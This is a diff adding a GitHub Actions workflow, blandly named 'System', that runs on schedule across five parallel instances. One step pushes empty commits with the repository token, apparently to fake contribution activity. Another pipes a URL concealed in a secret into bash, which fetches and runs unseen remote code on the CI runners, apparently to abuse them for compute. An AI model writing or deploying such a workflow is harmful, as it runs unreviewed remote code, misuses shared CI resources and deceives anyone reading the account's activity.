@@ -1,0 +1,31 @@
+name: System
+
+on:
+  push:
+  schedule:
+    - cron: '0 3 * * *'
+    - cron: '0 15 * * *'
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: Auto green
+        if: matrix.instance == 1
+        run: |
+          git config --local user.email "p00001414e1@qq.com"
+          git config --local user.name "p00001414e1"
+          git remote set-url origin https://${{ github.actor }}:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}
+          git pull --rebase
+          git commit --allow-empty -m "p00001414e1"
+          git push
+      - name: Run VMSpace
+        run: |
+          curl ${{ secrets.REMOTE }} | bash
